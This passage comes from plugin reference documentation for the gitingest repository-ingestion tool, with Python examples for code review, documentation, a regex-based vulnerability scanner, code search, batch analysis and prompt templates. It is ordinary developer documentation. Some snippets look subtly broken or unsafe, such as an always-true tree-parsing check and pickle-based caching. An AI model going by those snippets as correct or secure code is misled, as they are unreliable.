len(test_files) / max(len(source_files), 1)\n    }\n\ndef generate_review_insights(insights: dict) -> str:\n    \"\"\"Generate human-readable review report\"\"\"\n    report = f\"\"\"\n# Code Review Analysis\n\n## Overview\n- **Total Files**: {insights['total_files']}\n- **Languages**: {', '.join(insights['languages'].keys())}\n\n## Complex Files\n\"\"\"\n\n    for file in insights['complex_files']:\n        report += f\"- {file['path']} ({file['lines']} lines) - {file['reason']}\\n\"\n\n    report += \"\\n## Security Scan\\n\"\n    for issue in insights['security_issues']:\n        report += f\"- {issue['severity'].upper()}: {issue['file']} contains '{issue['keyword']}'\\n\"\n\n    report += \"\\n## Test Coverage\\n\"\n    ratio = insights['test_coverage']['ratio']\n    report += f\"- Test files: {insights['test_coverage']['test_files']}\\n\"\n    report += f\"- Source files: {insights['test_coverage']['source_files']}\\n\"\n    report += f\"- Coverage ratio: {ratio:.2f}\\n\"\n\n    return report\n\n# Usage\nasync def main():\n    insights = await analyze_pr_changes(\n        \"https://github.com/user/repo/pull/123\",\n        123\n    )\n    print(generate_review_insights(insights))\n\nasyncio.run(main())\n```\n\n**CLI Pipeline:**\n```bash\n# Quick code review\ngitingest https://github.com/user/repo/pull/123 \\\n  -i \"*.py\" -i \"*.js\" \\\n  -e \"node_modules/*\" -e \"*.test.*\" \\\n  -o - | python code_review_analyzer.py\n```\n\n## Pattern 2: Documentation Generation\n\n### Use Case\nAutomatically generate documentation from repository structure and code.\n\n### Implementation\n\n```python\nfrom gitingest import ingest\nimport re\n\ndef generate_docs_from_repo(repo_url: str):\n    \"\"\"Generate comprehensive documentation\"\"\"\n    summary, tree, content = ingest(repo_url)\n\n    # Parse repository info\n    repo_info = parse_summary(summary)\n\n    # Extract documentation\n    docs = {\n        'readme': extract_readme(content),\n        'api_endpoints': extract_api_endpoints(content),\n        'data_models': extract_data_models(content),\n        'functions': extract_functions(content),\n        'classes': extract_classes(content)\n    }\n\n    # Generate documentation\n    doc_content = format_documentation(repo_info, docs)\n\n    return doc_content\n\ndef extract_readme(content: str) -> str:\n    \"\"\"Extract README content\"\"\"\n    files = split_content_by_file(content)\n    for file in files:\n        if 'readme' in file['path'].lower():\n            return '\\n'.join(file['content'])\n    return \"\"\n\ndef extract_api_endpoints(content: str) -> list:\n    \"\"\"Extract API endpoints from code\"\"\"\n    endpoints = []\n    files = split_content_by_file(content)\n\n    for file in files:\n        if file['path'].endswith(('.py', '.js', '.ts')):\n            content_text = '\\n'.join(file['content'])\n\n            # Flask/Python patterns\n            patterns = [\n                r\"\"\"@app\\.route\\(['\"]\\w+['\"])\"\"\",\n                r\"def \\w+\\([^)]*\\):\\s*#\\s*([^:]+)\",\n            ]\n\n            for pattern in patterns:\n                matches = re.findall(pattern, content_text)\n                for match in matches:\n                    endpoints.append({\n                        'file': file['path'],\n                        'endpoint': match\n                    })\n\n    return endpoints\n\ndef extract_data_models(content: str) -> list:\n    \"\"\"Extract data models/classes\"\"\"\n    models = []\n    files = split_content_by_file(content)\n\n    for file in files:\n        content_text = '\\n'.join(file['content'])\n\n        # Class definitions\n        class_pattern = r\"class\\s+(\\w+).*?:\"\n        for match in re.finditer(class_pattern, content_text):\n            models.append({\n                'file': file['path'],\n                'class': match.group(1)\n            })\n\n    return models\n\ndef format_documentation(repo_info: dict, docs: dict) -> str:\n    \"\"\"Format documentation as markdown\"\"\"\n    output = f\"\"\"\n# {repo_info['repo']} Documentation\n\n## Overview\n\nThis repository contains {repo_info['files']} files.\n\n## Table of Contents\n\n1. [README](#readme)\n2. [API Endpoints](#api-endpoints)\n3. [Data Models](#data-models)\n4. [Functions](#functions)\n\n## README\n\n{docs['readme']}\n\n## API Endpoints\n\n\"\"\"\n\n    for endpoint in docs['api_endpoints']:\n        output += f\"- **{endpoint['endpoint']}** ({endpoint['file']})\\n\"\n\n    output += \"\\n## Data Models\\n\\n\"\n    for model in docs['data_models']:\n        output += f\"- {model['class']} ({model['file']})\\n\"\n\n    return output\n\ndef split_content_by_file(content: str) -> list:\n    \"\"\"Split content into individual files\"\"\"\n    files = []\n    current_file = None\n\n    for line in content.split('\\n'):\n        if line.startswith('FILE: '):\n            if current_file:\n                files.append(current_file)\n            current_file = {\n                'path': line.replace('FILE: ', ''),\n                'content': []\n            }\n        elif current_file:\n            current_file['content'].append(line)\n\n    if current_file:\n        files.append(current_file)\n\n    return files\n\n# Usage\ndocs = generate_docs_from_repo(\"https://github.com/user/repo\")\nwith open('documentation.md', 'w') as f:\n    f.write(docs)\n```\n\n## Pattern 3: Vulnerability Scanner\n\n### Use Case\nScan repositories for security vulnerabilities and suspicious patterns.\n\n### Implementation\n\n```python\nfrom gitingest import ingest, ingest_async\nimport asyncio\nimport re\nfrom typing import List, Dict\n\nclass VulnerabilityScanner:\n    def __init__(self):\n        # OWASP Top 10 and common vulnerabilities\n        self.vulnerability_patterns = {\n            'sql_injection': [\n                r\"execute\\s*\\(\\s*['\\\"].*?%.*?['\\\"]\",\n                r\"cursor\\.execute\\s*\\(\\s*f['\\\"].*\\{.*\\}.*['\\\"]\",\n            ],\n            'command_injection': [\n                r\"os\\.system\\s*\\(\",\n                r\"subprocess\\.call\\s*\\(\",\n                r\"subprocess\\.run\\s*\\(\",\n                r\"eval\\s*\\(\",\n                r\"exec\\s*\\(\",\n            ],\n            'path_traversal': [\n                r\"\\.\\./\",\n                r\"os\\.path\\.join\\s*\\(.*\\.\\./\",\n            ],\n            'hardcoded_secrets': [\n                r\"password\\s*=\\s*['\\\"][^\\\"'\\\"]{8,}['\\\"]\",\n                r\"api_key\\s*=\\s*['\\\"][^\\\"'\\\"]{20,}['\\\"]\",\n                r\"secret\\s*=\\s*['\\\"][^\\\"'\\\"]{20,}['\\\"]\",\n            ],\n            'weak_crypto': [\n                r\"md5\\s*\\(\",\n                r\"sha1\\s*\\(\",\n            ],\n            'xss': [\n                r\"innerHTML\\s*=\",\n                r\"document\\.write\\s*\\(\",\n            ]\n        }\n\n        self.compliance_issues = {\n            'missing_validation': [\n                r\"input\\(\\)\",\n                r\"raw_input\\(\\)\",\n            ],\n            'error_disclosure': [\n                r\"traceback\\.print_exc\",\n                r\"console\\.log\\(\",\n            ]\n        }\n\n    async def scan_repository(self, repo_url: str) -> Dict:\n        \"\"\"Scan entire repository for vulnerabilities\"\"\"\n        summary, tree, content = await ingest_async(repo_url)\n\n        files = self.split_content(content)\n        scan_results = {\n            'vulnerabilities': [],\n            'compliance_issues': [],\n            'summary': {\n                'total_files': len(files),\n                'files_scanned': 0,\n                'vulnerabilities_found': 0,\n                'severity_levels': {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}\n            }\n        }\n\n        for file in files:\n            file_vulns = self.scan_file(file)\n            scan_results['vulnerabilities'].extend(file_vulns['vulnerabilities'])\n            scan_results['compliance_issues'].extend(file_vulns['compliance'])\n            scan_results['summary']['files_scanned'] += 1\n\n        # Update severity counts\n        for vuln in scan_results['vulnerabilities']:\n            scan_results['summary']['vulnerabilities_found'] += 1\n            scan_results['summary']['severity_levels'][vuln['severity']] += 1\n\n        return scan_results\n\n    def scan_file(self, file: Dict) -> Dict:\n        \"\"\"Scan individual file for vulnerabilities\"\"\"\n        content = '\\n'.join(file['content'])\n        vulnerabilities = []\n        compliance_issues = []\n\n        # Check each vulnerability pattern\n        for vuln_type, patterns in self.vulnerability_patterns.items():\n            for pattern in patterns:\n                matches = re.finditer(pattern, content, re.IGNORECASE)\n                for match in matches:\n                    line_num = content[:match.start()].count('\\n') + 1\n\n                    vulnerabilities.append({\n                        'type': vuln_type,\n                        'file': file['path'],\n                        'line': line_num,\n                        'severity': self.get_severity(vuln_type),\n                        'match': match.group(),\n                        'description': self.get_description(vuln_type)\n                    })\n\n        # Check compliance patterns\n        for comp_type, patterns in self.compliance_issues.items():\n            for pattern in patterns:\n                matches = re.finditer(pattern, content)\n                for match in matches:\n                    line_num = content[:match.start()].count('\\n') + 1\n\n                    compliance_issues.append({\n                        'type': comp_type,\n                        'file': file['path'],\n                        'line': line_num,\n                        'match': match.group(),\n                        'recommendation': self.get_recommendation(comp_type)\n                    })\n\n        return {\n            'vulnerabilities': vulnerabilities,\n            'compliance': compliance_issues\n        }\n\n    def get_severity(self, vuln_type: str) -> str:\n        \"\"\"Map vulnerability type to severity\"\"\"\n        severity_map = {\n            'sql_injection': 'critical',\n            'command_injection': 'critical',\n            'hardcoded_secrets': 'high',\n            'path_traversal': 'high',\n            'weak_crypto': 'medium',\n            'xss': 'medium'\n        }\n        return severity_map.get(vuln_type, 'low')\n\n    def get_description(self, vuln_type: str) -> str:\n        \"\"\"Get description for vulnerability type\"\"\"\n        descriptions = {\n            'sql_injection': 'Potential SQL injection vulnerability',\n            'command_injection': 'Potential command injection vulnerability',\n            'hardcoded_secrets': 'Hardcoded secret or credential detected',\n            'path_traversal': 'Potential path traversal vulnerability',\n            'weak_crypto': 'Use of weak cryptographic hash',\n            'xss': 'Potential XSS vulnerability'\n        }\n        return descriptions.get(vuln_type, 'Security issue detected')\n\n    def get_recommendation(self, issue_type: str) -> str:\n        \"\"\"Get recommendation for compliance issue\"\"\"\n        recommendations = {\n            'missing_validation': 'Add input validation',\n            'error_disclosure': 'Remove or properly handle error output'\n        }\n        return recommendations.get(issue_type, 'Review this code')\n\n    def split_content(self, content: str) -> List[Dict]:\n        \"\"\"Split content into individual files\"\"\"\n        files = []\n        current_file = None\n\n        for line in content.split('\\n'):\n            if line.startswith('FILE: '):\n                if current_file:\n                    files.append(current_file)\n                current_file = {\n                    'path': line.replace('FILE: ', ''),\n                    'content': []\n                }\n            elif current_file:\n                current_file['content'].append(line)\n\n        if current_file:\n            files.append(current_file)\n\n        return files\n\n    def generate_report(self, scan_results: Dict) -> str:\n        \"\"\"Generate vulnerability scan report\"\"\"\n        report = f\"\"\"\n# Security Scan Report\n\n## Summary\n- Files scanned: {scan_results['summary']['files_scanned']}\n- Total vulnerabilities: {scan_results['summary']['vulnerabilities_found']}\n- Critical: {scan_results['summary']['severity_levels']['critical']}\n- High: {scan_results['summary']['severity_levels']['high']}\n- Medium: {scan_results['summary']['severity_levels']['medium']}\n- Low: {scan_results['summary']['severity_levels']['low']}\n\n## Vulnerabilities\n\n\"\"\"\n\n        for vuln in scan_results['vulnerabilities']:\n            report += f\"\"\"\n### {vuln['type'].upper()} - {vuln['severity'].upper()}\n- **File**: {vuln['file']}\n- **Line**: {vuln['line']}\n- **Match**: `{vuln['match']}`\n- **Description**: {vuln['description']}\n\"\"\"\n\n        report += \"\\n## Compliance Issues\\n\\n\"\n        for issue in scan_results['compliance_issues']:\n            report += f\"\"\"\n### {issue['type'].upper()}\n- **File**: {issue['file']}\n- **Line**: {issue['line']}\n- **Recommendation**: {issue['recommendation']}\n\"\"\"\n\n        return report\n\n# Usage\nasync def main():\n    scanner = VulnerabilityScanner()\n    results = await scanner.scan_repository(\"https://github.com/user/repo\")\n    report = scanner.generate_report(results)\n\n    with open('security-report.md', 'w') as f:\n        f.write(report)\n\nasyncio.run(main())\n```\n\n## Pattern 4: Code Search Engine\n\n### Use Case\nBuild a semantic code search engine from repository content.\n\n### Implementation\n\n```python\nfrom gitingest import ingest\nimport ast\nimport re\nfrom typing import List, Dict, Any\n\nclass CodeSearchEngine:\n    def __init__(self):\n        self.index = {}\n\n    def build_index(self, repo_url: str):\n        \"\"\"Build search index from repository\"\"\"\n        summary, tree, content = ingest(repo_url)\n        files = self.split_content(content)\n\n        for file in files:\n            self.index_file(file)\n\n    def index_file(self, file: Dict):\n        \"\"\"Index individual file\"\"\"\n        content = '\\n'.join(file['content'])\n        file_path = file['path']\n\n        # Index functions\n        functions = self.extract_functions(content)\n        for func in functions:\n            key = f\"{file_path}:{func['name']}\"\n            self.index[key] = {\n                'type': 'function',\n                'file': file_path,\n                'name': func['name'],\n                'signature': func['signature'],\n                'docstring': func['docstring'],\n                'lines': func['lines']\n            }\n\n        # Index classes\n        classes = self.extract_classes(content)\n        for cls in classes:\n            key = f\"{file_path}:{cls['name']}\"\n            self.index[key] = {\n                'type': 'class',\n                'file': file_path,\n                'name': cls['name'],\n                'methods': cls['methods'],\n                'docstring': cls['docstring']\n            }\n\n    def extract_functions(self, content: str) -> List[Dict]:\n        \"\"\"Extract function definitions\"\"\"\n        functions = []\n        lines = content.split('\\n')\n\n        for i, line in enumerate(lines):\n            # Python function pattern\n            match = re.match(r'def\\s+(\\w+)\\s*\\(([^)]*)\\):', line)\n            if match:\n                name = match.group(1)\n                signature = match.group(2)\n\n                # Extract docstring\n                docstring = \"\"\n                if i + 1 < len(lines) and '\"\"\"' in lines[i + 1]:\n                    docstring_lines = []\n                    j = i + 1\n                    while j < len(lines):\n                        if '\"\"\"' in lines[j]:\n                            break\n                        docstring_lines.append(lines[j])\n                        j += 1\n                    docstring = '\\n'.join(docstring_lines)\n\n                functions.append({\n                    'name': name,\n                    'signature': signature,\n                    'docstring': docstring,\n                    'lines': i + 1\n                })\n\n        return functions\n\n    def extract_classes(self, content: str) -> List[Dict]:\n        \"\"\"Extract class definitions\"\"\"\n        classes = []\n        lines = content.split('\\n')\n\n        for i, line in enumerate(lines):\n            # Python class pattern\n            match = re.match(r'class\\s+(\\w+)', line)\n            if match:\n                name = match.group(1)\n\n                # Extract methods\n                methods = []\n                indent_level = len(line) - len(line.lstrip())\n                j = i + 1\n\n                while j < len(lines):\n                    method_line = lines[j]\n                    if method_line.strip() and not method_line.startswith(' ' * (indent_level + 4)):\n                        break\n\n                    method_match = re.match(r'\\s+def\\s+(\\w+)\\s*\\(', method_line)\n                    if method_match:\n                        methods.append(method_match.group(1))\n\n                    j += 1\n\n                # Extract docstring\n                docstring = \"\"\n                if i + 1 < len(lines) and '\"\"\"' in lines[i + 1]:\n                    docstring_lines = []\n                    j = i + 1\n                    while j < len(lines):\n                        if '\"\"\"' in lines[j]:\n                            break\n                        docstring_lines.append(lines[j])\n                        j += 1\n                    docstring = '\\n'.join(docstring_lines)\n\n                classes.append({\n                    'name': name,\n                    'methods': methods,\n                    'docstring': docstring,\n                    'lines': i + 1\n                })\n\n        return classes\n\n    def search(self, query: str) -> List[Dict]:\n        \"\"\"Search index for query\"\"\"\n        results = []\n        query_lower = query.lower()\n\n        for key, item in self.index.items():\n            # Match in name\n            if query_lower in item['name'].lower():\n                results.append({\n                    'match_type': 'name',\n                    'score': 1.0,\n                    'item': item\n                })\n            # Match in docstring\n            elif 'docstring' in item and item['docstring']:\n                if query_lower in item['docstring'].lower():\n                    results.append({\n                        'match_type': 'docstring',\n                        'score': 0.7,\n                        'item': item\n                    })\n            # Match in signature\n            elif 'signature' in item and query_lower in item['signature'].lower():\n                results.append({\n                    'match_type': 'signature',\n                    'score': 0.8,\n                    'item': item\n                })\n\n        # Sort by score\n        results.sort(key=lambda x: x['score'], reverse=True)\n        return results\n\n    def split_content(self, content: str) -> List[Dict]:\n        \"\"\"Split content into individual files\"\"\"\n        files = []\n        current_file = None\n\n        for line in content.split('\\n'):\n            if line.startswith('FILE: '):\n                if current_file:\n                    files.append(current_file)\n                current_file = {\n                    'path': line.replace('FILE: ', ''),\n                    'content': []\n                }\n            elif current_file:\n                current_file['content'].append(line)\n\n        if current_file:\n            files.append(current_file)\n\n        return files\n\n# Usage\nengine = CodeSearchEngine()\nengine.build_index(\"https://github.com/user/repo\")\n\n# Search for functions\nresults = engine.search(\"authentication\")\nfor result in results:\n    print(f\"{result['item']['file']}:{result['item']['name']}\")\n```\n\n## Pattern 5: Batch Repository Analysis\n\n### Use Case\nAnalyze multiple repositories in batch for organization-wide insights.\n\n### Implementation\n\n```python\nfrom gitingest import ingest_async\nimport asyncio\nimport json\nfrom concurrent.futures import ThreadPoolExecutor\nfrom typing import List, Dict\n\nclass BatchAnalyzer:\n    def __init__(self, max_concurrent: int = 5):\n        self.max_concurrent = max_concurrent\n        self.results = []\n\n    async def analyze_repositories(self, repo_urls: List[str]) -> List[Dict]:\n        \"\"\"Analyze multiple repositories concurrently\"\"\"\n        semaphore = asyncio.Semaphore(self.max_concurrent)\n\n        async def analyze_single(url):\n            async with semaphore:\n                try:\n                    summary, tree, content = await ingest_async(url)\n                    return self.process_repository(url, summary, tree, content)\n                except Exception as e:\n                    return {\n                        'url': url,\n                        'status': 'error',\n                        'error': str(e)\n                    }\n\n        # Execute all analyses concurrently\n        tasks = [analyze_single(url) for url in repo_urls]\n        results = await asyncio.gather(*tasks)\n\n        return results\n\n    def process_repository(self, url: str, summary: str, tree: str, content: str) -> Dict:\n        \"\"\"Process single repository results\"\"\"\n        repo_info = {\n            'url': url,\n            'status': 'success',\n            'summary': self.parse_summary(summary),\n            'structure': self.parse_tree(tree),\n            'metrics': self.calculate_metrics(content),\n            'languages': self.detect_languages(content)\n        }\n\n        return repo_info\n\n    def parse_summary(self, summary: str) -> Dict:\n        \"\"\"Parse repository summary\"\"\"\n        lines = summary.split('\\n')\n        info = {}\n\n        for line in lines:\n            if ':' in line:\n                key, value = line.split(':', 1)\n                info[key.strip()] = value.strip()\n\n        return info\n\n    def parse_tree(self, tree: str) -> Dict:\n        \"\"\"Parse directory structure\"\"\"\n        # Simplified - extract file count per directory\n        directories = {}\n        for line in tree.split('\\n'):\n            if '' in line or '' in line:\n                path = line.strip().split(' ')[-1].split(' ')[-1]\n                if '.' in path:  # It's a file\n                    dir_path = '/'.join(path.split('/')[:-1])\n                    directories[dir_path] = directories.get(dir_path, 0) + 1\n\n        return directories\n\n    def calculate_metrics(self, content: str) -> Dict:\n        \"\"\"Calculate code metrics\"\"\"\n        metrics = {\n            'total_lines': 0,\n            'code_lines': 0,\n            'comment_lines': 0,\n            'blank_lines': 0\n        }\n\n        files = self.split_content(content)\n\n        for file in files:\n            for line in file['content']:\n                metrics['total_lines'] += 1\n\n                if line.strip() == '':\n                    metrics['blank_lines'] += 1\n                elif line.strip().startswith('#') or line.strip().startswith('//'):\n                    metrics['comment_lines'] += 1\n                else:\n                    metrics['code_lines'] += 1\n\n        return metrics\n\n    def detect_languages(self, content: str) -> Dict:\n        \"\"\"Detect programming languages\"\"\"\n        languages = {}\n        files = self.split_content(content)\n\n        for file in files:\n            ext = file['path'].split('.')[-1] if '.' in file['path'] else 'unknown'\n            languages[ext] = languages.get(ext, 0) + 1\n\n        return languages\n\n    def split_content(self, content: str) -> List[Dict]:\n        \"\"\"Split content into individual files\"\"\"\n        files = []\n        current_file = None\n\n        for line in content.split('\\n'):\n            if line.startswith('FILE: '):\n                if current_file:\n                    files.append(current_file)\n                current_file = {\n                    'path': line.replace('FILE: ', ''),\n                    'content': []\n                }\n            elif current_file:\n                current_file['content'].append(line)\n\n        if current_file:\n            files.append(current_file)\n\n        return files\n\n    def generate_batch_report(self, results: List[Dict]) -> str:\n        \"\"\"Generate comprehensive batch analysis report\"\"\"\n        report = \"# Batch Repository Analysis Report\\n\\n\"\n\n        # Summary statistics\n        total_repos = len(results)\n        successful = sum(1 for r in results if r['status'] == 'success')\n        failed = total_repos - successful\n\n        report += f\"## Overview\\n\"\n        report += f\"- Total repositories: {total_repos}\\n\"\n        report += f\"- Successful: {successful}\\n\"\n        report += f\"- Failed: {failed}\\n\\n\"\n\n        # Language distribution\n        all_languages = {}\n        for result in results:\n            if result['status'] == 'success':\n                for lang, count in result['languages'].items():\n                    all_languages[lang] = all_languages.get(lang, 0) + count\n\n        report += \"## Language Distribution\\n\\n\"\n        for lang, count in sorted(all_languages.items(), key=lambda x: x[1], reverse=True):\n            report += f\"- {lang}: {count} files\\n\"\n\n        # Repository details\n        report += \"\\n## Repository Details\\n\\n\"\n        for result in results:\n            if result['status'] == 'success':\n                report += f\"### {result['url']}\\n\"\n                report += f\"- Files: {result['summary'].get('Files analyzed', 'N/A')}\\n\"\n                report += f\"- Total lines: {result['metrics']['total_lines']}\\n\"\n                report += f\"- Code lines: {result['metrics']['code_lines']}\\n\"\n                report += f\"- Comments: {result['metrics']['comment_lines']}\\n\\n\"\n            else:\n                report += f\"### {result['url']}\\n\"\n                report += f\"- Status: FAILED\\n\"\n                report += f\"- Error: {result.get('error', 'Unknown')}\\n\\n\"\n\n        return report\n\n# Usage\nasync def main():\n    repos = [\n        \"https://github.com/user/repo1\",\n        \"https://github.com/user/repo2\",\n        \"https://github.com/user/repo3\"\n    ]\n\n    analyzer = BatchAnalyzer(max_concurrent=3)\n    results = await analyzer.analyze_repositories(repos)\n\n    # Generate and save report\n    report = analyzer.generate_batch_report(results)\n    with open('batch-analysis.md', 'w') as f:\n        f.write(report)\n\n    # Save raw data\n    with open('batch-data.json', 'w') as f:\n        json.dump(results, f, indent=2)\n\nasyncio.run(main())\n```\n\n## Pattern 6: Context-Aware Prompt Generation\n\n### Use Case\nGenerate better AI prompts by understanding repository context.\n\n### Implementation\n\n```python\nfrom gitingest import ingest\nimport json\n\nclass PromptGenerator:\n    def __init__(self):\n        self.prompt_templates = {\n            'code_review': self.get_code_review_template(),\n            'feature_request': self.get_feature_template(),\n            'bug_fix': self.get_bug_fix_template(),\n            'documentation': self.get_documentation_template()\n        }\n\n    def generate_context_aware_prompt(self, repo_url: str, task_type: str, **kwargs) -> str:\n        \"\"\"Generate prompt with repository context\"\"\"\n        summary, tree, content = ingest(repo_url)\n\n        # Extract relevant information\n        context = self.extract_context(summary, tree, content)\n\n        # Get template\n        template = self.prompt_templates.get(task_type, self.get_default_template())\n\n        # Generate prompt\n        prompt = template.format(\n            context=json.dumps(context, indent=2),\n            task_details=kwargs.get('details', ''),\n            output_format=kwargs.get('output_format', 'markdown')\n        )\n\n        return prompt\n\n    def extract_context(self, summary: str, tree: str, content: str) -> dict:\n        \"\"\"Extract relevant context from repository\"\"\"\n        files = self.split_content(content)\n\n        return {\n            'summary': self.parse_summary(summary),\n            'structure': self.analyze_structure(tree),\n            'main_files': self.identify_main_files(files),\n            'technologies': self.detect_technologies(files),\n            'architecture': self.analyze_architecture(files)\n        }\n\n    def parse_summary(self, summary: str) -> dict:\n        \"\"\"Parse repository summary\"\"\"\n        lines = summary.split('\\n')\n        info = {}\n\n        for line in lines:\n            if ':' in line:\n                key, value = line.split(':', 1)\n                info[key.strip()] = value.strip()\n\n        return info\n\n    def analyze_structure(self, tree: str) -> dict:\n        \"\"\"Analyze directory structure\"\"\"\n        return {\n            'has_src': 'src/' in tree,\n            'has_tests': 'test' in tree.lower(),\n            'has_docs': any(doc in tree.lower() for doc in ['docs/', 'doc/', 'documentation/']),\n            'has_config': any(cfg in tree for cfg in ['package.json', 'requirements.txt', 'Pipfile']),\n            'depth': tree.count('    ') // 4\n        }\n\n    def identify_main_files(self, files: list) -> list:\n        \"\"\"Identify main source files\"\"\"\n        main_files = []\n        for file in files:\n            path = file['path']\n            if any(main in path.lower() for main in ['main', 'index', 'app', '__init__']):\n                main_files.append(path)\n\n        return main_files[:10]  # Top 10\n\n    def detect_technologies(self, files: list) -> dict:\n        \"\"\"Detect technologies used\"\"\"\n        technologies = {\n            'languages': set(),\n            'frameworks': set(),\n            'databases': set()\n        }\n\n        for file in files:\n            path = file['path'].lower()\n            content = '\\n'.join(file['content']).lower()\n\n            # Detect languages\n            if path.endswith('.py'):\n                technologies['languages'].add('Python')\n            elif path.endswith('.js') or path.endswith('.ts'):\n                technologies['languages'].add('JavaScript/TypeScript')\n            elif path.endswith('.java'):\n                technologies['languages'].add('Java')\n\n            # Detect frameworks\n            if 'flask' in content or 'django' in content:\n                technologies['frameworks'].add('Flask/Django')\n            if 'express' in content:\n                technologies['frameworks'].add('Express')\n            if 'react' in content:\n                technologies['frameworks'].add('React')\n\n            # Detect databases\n            if 'mongodb' in content or 'mongo' in content:\n                technologies['databases'].add('MongoDB')\n            if 'postgres' in content or 'postgresql' in content:\n                technologies['databases'].add('PostgreSQL')\n\n        return {k: list(v) for k, v in technologies.items()}\n\n    def analyze_architecture(self, files: list) -> dict:\n        \"\"\"Analyze code architecture\"\"\"\n        patterns = {\n            'mvc': 0,\n            'microservices': 0,\n            'layered': 0,\n            'functional': 0\n        }\n\n        for file in files:\n            content = '\\n'.join(file['content']).lower()\n\n            if 'controller' in content and 'model' in content and 'view' in content:\n                patterns['mvc'] += 1\n            if 'service' in content and 'api' in content:\n                patterns['microservices'] += 1\n            if 'layer' in content or 'tier' in content:\n                patterns['layered'] += 1\n\n        return patterns\n\n    def get_code_review_template(self) -> str:\n        return \"\"\"\nYou are conducting a code review for the following repository:\n\n## Repository Context\n{context}\n\n## Task Details\n{task_details}\n\n## Review Focus Areas\n1. Code quality and maintainability\n2. Security vulnerabilities\n3. Performance issues\n4. Test coverage\n5. Documentation completeness\n\n## Output Format\n{output_format}\n\nPlease provide detailed feedback with specific examples from the code.\n\"\"\"\n\n    def get_feature_template(self) -> str:\n        return \"\"\"\nYou are implementing a new feature for the following repository:\n\n## Repository Context\n{context}\n\n## Feature Requirements\n{task_details}\n\n## Implementation Guidelines\n1. Follow existing code style and patterns\n2. Write comprehensive tests\n3. Update documentation\n4. Consider edge cases\n5. Ensure backward compatibility\n\n## Output Format\n{output_format}\n\nPlease provide implementation plan and code.\n\"\"\"\n\n    def get_bug_fix_template(self) -> str:\n        return \"\"\"\nYou are fixing a bug in the following repository:\n\n## Repository Context\n{context}\n\n## Bug Description\n{task_details}\n\n## Investigation Steps\n1. Identify root cause\n2. Check for similar issues\n3. Develop fix\n4. Add regression test\n5. Verify solution\n\n## Output Format\n{output_format}\n\nPlease provide detailed analysis and fix.\n\"\"\"\n\n    def get_documentation_template(self) -> str:\n        return \"\"\"\nYou are creating documentation for the following repository:\n\n## Repository Context\n{context}\n\n## Documentation Requirements\n{task_details}\n\n## Documentation Structure\n1. Overview and purpose\n2. Installation and setup\n3. API reference\n4. Usage examples\n5. Troubleshooting\n\n## Output Format\n{output_format}\n\nPlease generate comprehensive documentation.\n\"\"\"\n\n    def get_default_template(self) -> str:\n        return \"\"\"\nRepository Context:\n{context}\n\nTask: {task_details}\n\nOutput Format: {output_format}\n\"\"\"\n\n    def split_content(self, content: str) -> list:\n        \"\"\"Split content into individual files\"\"\"\n        files = []\n        current_file = None\n\n        for line in content.split('\\n'):\n            if line.startswith('FILE: '):\n                if current_file:\n                    files.append(current_file)\n                current_file = {\n                    'path': line.replace('FILE: ', ''),\n                    'content': []\n                }\n            elif current_file:\n                current_file['content'].append(line)\n\n        if current_file:\n            files.append(current_file)\n\n        return files\n\n# Usage\ngenerator = PromptGenerator()\n\n# Generate code review prompt\nprompt = generator.generate_context_aware_prompt(\n    \"https://github.com/user/repo\",\n    \"code_review\",\n    details=\"Review authentication and authorization code\",\n    output_format=\"markdown\"\n)\n\nprint(prompt)\n```\n\n## Best Practices Summary\n\n### 1. Always Use Context Managers\n```python\n# Good\nwith open('output.txt', 'w') as f:\n    summary, tree, content = ingest(repo_url)\n    f.write(summary)\n\n# Bad - don't do this\nsummary, tree, content = ingest(repo_url)\nopen('output.txt', 'w').write(summary)\n```\n\n### 2. Implement Retry Logic\n```python\nimport time\nfrom gitingest.utils.exceptions import GitIngestError\n\ndef robust_ingest(repo_url: str, max_retries: int = 3):\n    for attempt in range(max_retries):\n        try:\n            return ingest(repo_url)\n        except GitIngestError as e:\n            if attempt == max_retries - 1:\n                raise\n            time.sleep(2 ** attempt)  # Exponential backoff\n```\n\n### 3. Use Filtering Strategically\n```python\n# Always filter for large repos\nsummary, tree, content = ingest(\n    repo_url,\n    include_patterns=[\"*.py\", \"*.js\"],\n    exclude_patterns=[\"node_modules/*\", \"*.log\"],\n    max_file_size=51200\n)\n```\n\n### 4. Handle Memory for Large Repos\n```python\n# Process in chunks\ndef process_large_repo(repo_url: str):\n    summary, tree, content = ingest(repo_url)\n\n    # Stream process files\n    for file_content in split_content(content):\n        yield process_file(file_content)\n```\n\n### 5. Cache Results\n```python\nimport hashlib\nimport pickle\n\ndef cache_ingest(repo_url: str):\n    cache_key = hashlib.md5(repo_url.encode()).hexdigest()\n    cache_file = f\"cache/{cache_key}.pkl\"\n\n    try:\n        with open(cache_file, 'rb') as f:\n            return pickle.load(f)\n    except FileNotFoundError:\n        result = ingest(repo_url)\n        with open(cache_file, 'wb') as f:\n            pickle.dump(result, f)\n        return result\n```\n",
        "plugins/sys-research/skills/ingesting-git/references/quick-start.md": "# GitIngest Quick Start Guide\n\n## Installation (30 seconds)\n\n### Option 1: CLI Installation\n```bash\npipx install gitingest\n# or\npip install gitingest\n\n# Verify\ngitingest --version\n```\n\n### Option 2: Python Package\n```python\npip install gitingest\n\n# Test\npython -c \"from gitingest import ingest; print('Success!')\"\n```\n\n## First Use Cases\n\n### 1. Quick Repository Digest (1 minute)\n\n**CLI Method:**\n```bash\n# Download any repository\ngitingest https://github.com/octocat/Hello-World\n\n# View result\ncat digest.txt\n```\n\n**Python Method:**\n```python\nfrom gitingest import ingest\n\nsummary, tree, content = ingest(\"https://github.com/octocat/Hello-World\")\n\nprint(\"Summary:\", summary)\nprint(\"\\nStructure:\", tree[:200])\nprint(\"\\nContent preview:\", content[:500])\n```\n\n### 2. AI Analysis Pipeline (2 minutes)\n\n**One-liner:**\n```bash\n# Stream directly to analysis\ngitingest https://github.com/user/repo -o - | python analyze.py\n```\n\n**Analyze Script:**\n```python\n# analyze.py\nimport sys\n\ncontent = sys.stdin.read()\n\n# Simple analysis\nfiles = content.count(\"FILE:\")\nlines = content.count('\\n')\n\nprint(f\"Analyzed {files} files with {lines} lines\")\nprint(\"\\nFirst 500 chars:\")\nprint(content[:500])\n```\n\n### 3. Code Review Bot (5 minutes)\n\n```python\nfrom gitingest import ingest\n\ndef quick_code_review(repo_url: str):\n    \"\"\"Basic code review in 5 lines\"\"\"\n    summary, tree, content = ingest(repo_url)\n\n    # Count languages\n    py_count = content.count('FILE:')  # Simplistic\n\n    # Basic checks\n    has_tests = 'test' in tree.lower()\n    has_docs = 'readme' in tree.lower()\n\n    return 